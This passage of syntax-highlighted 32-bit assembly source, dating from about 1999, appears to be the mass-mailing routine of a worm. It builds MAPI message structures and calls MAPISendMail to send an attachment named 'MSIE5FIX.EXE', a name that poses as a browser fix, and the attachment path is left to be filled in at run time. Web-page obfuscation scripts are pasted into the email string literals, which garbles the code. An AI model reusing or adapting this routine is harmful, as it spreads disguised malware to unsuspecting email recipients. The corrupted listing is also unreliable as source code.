+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;ulRecipClass &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;MAPI_ORIG</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>szNameFrom<span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;lpszName</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>szMailFrom<span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;lpszAddress</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;ulEIDSize</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;lpEntryID</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Message destination</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;ulReserved </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> <span style="color: #46aa03; font-weight: bold;">eax</span> <span style="color: black; font-style: italic;">;MAPI_TO</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;ulRecipClass</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>szNameTo<span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;lpszName</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>szMailTo<span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;lpszAddress</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;ulEIDSize</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;lpEntryID</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Attachments</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;ulReserved</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;flFlags</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00000000h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;nPosition</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>szFileAttach<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;lpszPathName</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>szFileMsg<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;lpszFileName</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;lpFileType</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Send mail</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">00000000h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">00000000h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>MapiMessage<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">00000000h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>hMAPISession<span style="color: black;">&#93;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>a_MAPISendMail<span style="color: black;">&#93;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Log off</span><br/>
+<br/>
+logoutMAPI32<span style="color: #339933;">:</span> &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">00000000h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">00000000h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">00000000h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>hMAPISession<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>a_MAPILogoff<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Free MAPI32.DLL</span><br/>
+<br/>
+freeMAPI32<span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>hMAPI32<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> FreeLibrary<br/>
+<br/>
+errMAPI32<span style="color: #339933;">:</span>&nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">00000000h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> ExitProcess<br/>
+<br/>
+_TEXT &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ends<br/>
+<br/>
+_DATA &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">segment</span> <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: #0000ff; font-weight: bold;">use32</span> <span style="color: #0000ff; font-weight: bold;">public</span> <span style="color: #7f007f;">'DATA'</span><br/>
+<br/>
+hMAPI32 &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span><br/>
+a_MAPILogon &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span><br/>
+a_MAPILogoff&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span><br/>
+a_MAPISendMail&nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span><br/>
+<br/>
+hMAPISession&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span><br/>
+<br/>
+szUsername&nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+szPassword&nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+<br/>
+szNameFrom&nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;test&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Originator</span><br/>
+szMailFrom&nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;SMTP:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b3c7d6c0c7f3c7d6c0c79ddcc1d4">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+<br/>
+szNameTo&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;yourself&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Destination</span><br/>
+szMailTo&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;SMTP:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1c6573696e6f79707a5c6573696e6f79707a32736e7b">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+<br/>
+szSubject &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;Testing MAPI32&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+szNoteText&nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;This is the message body&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+<br/>
+szDate&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;1999/06/06 16:06&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+<br/>
+szFileAttach&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> MAX_PATH dup <span style="color: black;">&#40;</span><span style="color: #ff0000;">00h</span><span style="color: black;">&#41;</span><br/>
+<br/>
+szFileMsg &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;MSIE5FIX.EXE&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+<br/>
+MapiMessage &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">equ</span> <span style="color: #0000ff; font-weight: bold;">$</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;ulReserved&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;lpszSubject &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;lpszNoteText&nbsp; &nbsp; &nbsp; </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;lpszMessageType </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;lpszDate&nbsp; </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;lpszConversationID&nbsp; &nbsp; &nbsp; &nbsp; </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;flFlags &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;lpOriginator&nbsp; &nbsp; &nbsp; </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;nRecipCount &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;lpRecips&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;nFileCount</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;lpFiles &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br/>
+<br/>
+MsgFrom &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">equ</span> <span style="color: #0000ff; font-weight: bold;">$</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;ulReserved </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;ulRecipClass</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;lpszName</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;lpszAddress</span><br/>
